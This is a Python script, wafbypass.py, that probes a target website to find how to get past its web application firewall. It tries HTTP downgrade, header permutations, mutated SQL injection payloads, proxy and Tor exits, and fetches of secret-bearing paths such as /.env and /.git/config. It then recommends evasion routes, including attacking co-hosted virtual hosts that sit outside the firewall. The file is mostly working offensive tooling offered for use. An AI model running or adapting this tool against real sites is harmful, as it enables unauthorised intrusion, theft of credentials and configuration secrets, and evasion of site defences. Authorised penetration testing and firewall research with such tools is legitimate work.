#!/usr/bin/env python3
"""
wafbypass.py — figure out WHY a request is blocked and which transport gets through.

Diagnostic order (cheapest first):
  1. is it a WAF (status code) or an IP drop (000/timeout)?
  2. does plain HTTP work when HTTPS is filtered?
  3. does a header permutation pass?
  4. does a payload mutation pass (keyword evasion)?
  5. does a proxy exit (env, tor) pass?

Prints a ranked recommendation; it does not itself exploit anything.

usage:
  python3 wafbypass.py https://target.com/?id=1 --payload "' UNION SELECT 1--"
  python3 wafbypass.py https://target.com --paths /.env,/.git/config
"""
from __future__ import annotations

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lib.webutil import (Client, detect_waf, evasion_headers, jsonout, mutate_payload,  # noqa: E402
                         norm_url, redact, table)

BLOCK_CODES = {403, 405, 406, 419, 429, 503, 501}


def probe(client, url, label, headers=None):
    r = client.get(url, headers=headers or {})
    return {"transport": label, "status": r.status, "size": r.size,
            "ms": round(r.elapsed * 1000), "elapsed_err": r.error,
            "blocked": r.status in BLOCK_CODES or r.status == 0,
            "waf": detect_waf(r), "via": r.via}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("--payload", default="' UNION SELECT 1,2,3-- -")
    ap.add_argument("--paths", default="")
    ap.add_argument("--timeout", type=int, default=10)
    a = ap.parse_args()

    base = norm_url(a.target)
    plain = Client(timeout=a.timeout)
    results = {"target": base, "tests": [], "recommendation": [], "waf": []}

    root = plain.get(base + "/")
    results["waf"] = detect_waf(root)
    results["root"] = {"status": root.status, "size": root.size, "error": root.error}

    # 1. HTTPS vs HTTP
    results["tests"].append(probe(plain, base + "/", "https-direct"))
    if base.startswith("https://"):
        htt = base.replace("https://", "http://", 1)
        results["tests"].append(probe(Client(timeout=a.timeout, follow=True), htt + "/", "http-direct"))

    # 2. header permutations
    for i, h in enumerate(evasion_headers()):
        if not h:
            continue
        results["tests"].append(probe(plain, base + "/", f"hdr:{','.join(h)}", h))

    # 3. payload mutations
    u = base + "/?wexec=1"
    for lvl in (1, 2, 3, 4):
        m = mutate_payload(a.payload, lvl)
        import urllib.parse
        results["tests"].append(probe(plain, base + "/?wexec=" + urllib.parse.quote(m), f"payload-mutate-L{lvl}"))

    # 4. proxy exits
    if os.environ.get("WEXEC_PROXY"):
        results["tests"].append(probe(Client(timeout=a.timeout, proxy=os.environ["WEXEC_PROXY"]), base + "/", "proxy:env"))
    tor = os.environ.get("WEXEC_TOR", "socks5h://127.0.0.1:9050")
    try:
        results["tests"].append(probe(Client(timeout=8, proxy=tor), base + "/", "proxy:tor"))
    except Exception:
        pass

    # 5. sensitive paths through each working transport
    path_hits = []
    for p in [x for x in a.paths.split(",") if x]:
        for label, cl in (("direct", plain),):
            r = cl.get(base + p)
            path_hits.append({"path": p, "transport": label, "status": r.status, "size": r.size})
    results["path_hits"] = path_hits

    # recommendation
    ok = [t for t in results["tests"] if not t["blocked"] and t["status"] not in (0,)]
    if results["waf"]:
        results["recommendation"].append(f"WAF detected: {','.join(results['waf'])} — origin IP discovery is the shortest path")
    if any(t["transport"] == "http-direct" and not t["blocked"] for t in ok) and \
       not any(t["transport"] == "https-direct" and not t["blocked"] for t in ok):
        results["recommendation"].append("HTTP works while HTTPS is filtered — use plain HTTP for recon (WAF on TLS only)")
    good_hdr = [t for t in ok if t["transport"].startswith("hdr:")]
    if good_hdr:
        results["recommendation"].append(f"passing header permutation: {good_hdr[0]['transport']}")
    good_mut = [t for t in ok if t["transport"].startswith("payload-mutate")]
    if good_mut:
        results["recommendation"].append(f"passing payload obfuscation level: {good_mut[0]['transport']}")
    good_proxy = [t for t in ok if t["transport"].startswith("proxy")]
    if good_proxy:
        results["recommendation"].append(f"working proxy exit: {good_proxy[0]['transport']}")
    if not results["recommendation"]:
        results["recommendation"].append("no bypass found here — pivot to co-host: enumerate subdomains on the same IP, "
                                         "attack the vhost without the WAF")

    print(table([[t["transport"], t["status"], t["size"], t["ms"], "BLOCK" if t["blocked"] else "ok"]
                 for t in results["tests"]], ["TRANSPORT", "CODE", "SIZE", "MS", "STATE"]), file=sys.stderr)
    for r in results["recommendation"]:
        print("-> " + redact(r), file=sys.stderr)
    print(jsonout(results))
    return 0


if __name__ == "__main__":
    sys.exit(main())
